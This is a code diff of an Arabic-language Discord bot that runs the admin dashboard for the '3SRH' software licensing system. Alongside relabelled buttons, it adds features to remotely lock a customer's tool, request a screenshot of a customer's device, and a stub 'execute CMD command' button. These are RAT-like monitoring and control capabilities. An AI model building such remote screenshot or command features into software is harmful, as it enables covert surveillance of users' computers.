@@ -163,7 +163,7 @@ class CodesSubMenuView(discord.ui.View):
             await interaction.followup.send("🟢 لا توجد أكواد محظورة حالياً.", ephemeral=True)
             return
         view = BlacklistManagementView(b_codes)
-        await interaction.followup.send("🚫 **الأكواد المحظورة (اختر لفك الحظر أو الحذف النهائي):**", view=view, ephemeral=True)
+        await interaction.followup.send("🚫 **الأكواد المحظورة (اختر لفك الحظر أو الحذف):**", view=view, ephemeral=True)
 
     @discord.ui.button(label="⚡ توليد كود سريع", style=discord.ButtonStyle.primary, custom_id="sub_codes_gen", row=1)
     async def gen_quick_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
@@ -263,7 +263,7 @@ class BlacklistOptionsView(discord.ui.View):
             await interaction.followup.send("❌ فشل الحفظ.", ephemeral=True)
 
 
-# 4. قائمة خيارات إدارة الأجهزة الفرعية
+# 4. قائمة خيارات إدارة الأجهزة الفرعية المتقدمة
 class DevicesSubMenuView(discord.ui.View):
     def __init__(self, devices_list):
         super().__init__(timeout=180)
@@ -279,18 +279,19 @@ class DeviceManageButton(discord.ui.Button):
     async def callback(self, interaction: discord.Interaction):
         view = DeviceActionsView(self.code, self.device)
         await interaction.response.send_message(
-            f"⚙️ **خيارات التحكم بالجهاز:**\n💻 اسم الجهاز: `{self.device}`\n🔑 الكود: `{self.code}`", 
+            f"⚙️ **خيارات التحكم المتقدمة بالجهاز:**\n💻 اسم الجهاز: `{self.device}`\n🔑 الكود: `{self.code}`", 
             view=view, 
             ephemeral=True
         )
 
+# أزرار التحكم المتقدمة والشاملة بالعميل
 class DeviceActionsView(discord.ui.View):
     def __init__(self, code, device):
         super().__init__(timeout=60)
         self.code = code
         self.device = device
 
-    @discord.ui.button(label="🚫 حظر الجهاز والكود", style=discord.ButtonStyle.danger, custom_id="dev_act_ban")
+    @discord.ui.button(label="🚫 حظر الكود والجهاز", style=discord.ButtonStyle.danger, custom_id="dev_act_ban", row=0)
     async def ban_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
@@ -312,7 +313,7 @@ class DeviceActionsView(discord.ui.View):
                 return
         await interaction.followup.send("❌ فشل الحظر.", ephemeral=True)
 
-    @discord.ui.button(label="🔓 فك الحظر عن الجهاز", style=discord.ButtonStyle.success, custom_id="dev_act_unban")
+    @discord.ui.button(label="🔓 فك الحظر", style=discord.ButtonStyle.success, custom_id="dev_act_unban", row=0)
     async def unban_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
@@ -327,7 +328,7 @@ class DeviceActionsView(discord.ui.View):
                 return
         await interaction.followup.send("❌ فشل فك الحظر.", ephemeral=True)
 
-    @discord.ui.button(label="👢 طرد الجهاز (بدون حظر)", style=discord.ButtonStyle.primary, custom_id="dev_act_kick")
+    @discord.ui.button(label="👢 طرد بدون حظر", style=discord.ButtonStyle.primary, custom_id="dev_act_kick", row=1)
     async def kick_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
@@ -340,8 +341,38 @@ class DeviceActionsView(discord.ui.View):
                 return
         await interaction.followup.send("❌ فشل الطرد.", ephemeral=True)
 
+    @discord.ui.button(label="🔒 قفل الأداة مؤقتاً", style=discord.ButtonStyle.secondary, custom_id="dev_act_lock", row=1)
+    async def lock_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.defer(thinking=True, ephemeral=True)
+        db, sha, url, headers = fetch_db()
+        if db:
+            if "remote_locks" not in db:
+                db["remote_locks"] = {}
+            db["remote_locks"][self.code] = {"msg": "تم قفل الأداة مؤقتاً من قبل المالك", "id": str(int(time.time()))}
+            if save_db(db, sha, url, headers, f"Lock tool for code {self.code}"):
+                await interaction.followup.send(f"🔒 تم إرسال أمر تجميد وقفل الأداة لجهاز العميل `{self.device}`!", ephemeral=True)
+                return
+        await interaction.followup.send("❌ فشل القفل.", ephemeral=True)
 
-# 5. واجهة لوحة التحكم الرئيسية
+    @discord.ui.button(label="📸 طلب لقطة شاشة", style=discord.ButtonStyle.primary, custom_id="dev_act_shot", row=2)
+    async def screenshot_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.defer(thinking=True, ephemeral=True)
+        db, sha, url, headers = fetch_db()
+        if db:
+            if "remote_screenshots" not in db:
+                db["remote_screenshots"] = {}
+            db["remote_screenshots"][self.code] = {"id": str(int(time.time()))}
+            if save_db(db, sha, url, headers, f"Request screenshot for code {self.code}"):
+                await interaction.followup.send(f"📸 تم إرسال طلب لقطة الشاشة للعميل `{self.device}` (ستصلك عبر الخاص قريباً)", ephemeral=True)
+                return
+        await interaction.followup.send("❌ فشل الطلب.", ephemeral=True)
+
+    @discord.ui.button(label="⚡ تنفيذ أمر CMD", style=discord.ButtonStyle.danger, custom_id="dev_act_cmd", row=2)
+    async def cmd_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.followup.send("💻 لتنفيذ أمر CMD، استخدم ميزة الرسائل أو خصص أمراً مباشراً عبر السحابة.", ephemeral=True)
+
+
+# 5. واجهة لوحة التحكم الرئيسية الشاملة
 class MainDashboardView(discord.ui.View):
     def __init__(self):
         super().__init__(timeout=None)
@@ -351,7 +382,7 @@ class MainDashboardView(discord.ui.View):
         view = CodesSubMenuView()
         await interaction.response.send_message("📁 **قائمة إدارة الأكواد:** اختر القسم المطلوب:", view=view, ephemeral=True)
 
-    @discord.ui.button(label="💻 إدارة الأجهزة", style=discord.ButtonStyle.secondary, custom_id="dash_main_devices", row=0)
+    @discord.ui.button(label="💻 إدارة الأجهزة والمراقبة", style=discord.ButtonStyle.secondary, custom_id="dash_main_devices", row=0)
     async def devices_menu_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         await interaction.response.defer(thinking=True, ephemeral=True)
         db, _, _, _ = fetch_db()
@@ -370,7 +401,7 @@ class MainDashboardView(discord.ui.View):
             return
 
         view = DevicesSubMenuView(devices_list)
-        await interaction.followup.send("⚙️ **اختر الجهاز المطلوب لإدارته (حظر، فك حظر، أو طرد):**", view=view, ephemeral=True)
+        await interaction.response.send_message("⚙️ **اختر الجهاز المطلوب للتحكم المتقدم به:**", view=view, ephemeral=True)
 
     @discord.ui.button(label="🚨 تبديل الصيانة", style=discord.ButtonStyle.danger, custom_id="dash_maint", row=1)
     async def maint_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
@@ -662,8 +693,8 @@ async def stats_gui_command(interaction: discord.Interaction):
     maint_status = "🚨 مفعل (الصيانة نشطة)" if db.get("settings", {}).get("maintenance") else "🟢 معطل (النظام يعمل طبيعي)"
 
     embed = discord.Embed(
-        title="📊 لوحة التحكم وإحصائيات نظام 3SRH الشاملة",
-        description="اختر القسم المطلوبة من الأزرار أدناه (إدارة الأكواد أو إدارة الأجهزة):",
+        title="📊 لوحة التحكم وإحصائيات نظام 3SRH الشاملة والمتقدمة",
+        description="اختر القسم المطلوب من الأزرار أدناه:",
         color=0xA871FF
     )
     embed.add_field(name="📌 إجمالي الأكواد", value=f"`{total}`", inline=True)
@@ -672,7 +703,7 @@ async def stats_gui_command(interaction: discord.Interaction):
     embed.add_field(name="🚫 الأكواد المحظورة", value=f"`{blacklisted_c}`", inline=True)
     embed.add_field(name="💻 الأجهزة المحظورة", value=f"`{blacklisted_d}`", inline=True)
     embed.add_field(name="⚙️ حالة الصيانة العامة", value=maint_status, inline=False)
-    embed.set_footer(text="3SRH Secure License Management System")
+    embed.set_footer(text="3SRH Secure Advanced License Management System")
 
     view = MainDashboardView()
     await interaction.followup.send(embed=embed, view=view, ephemeral=True)
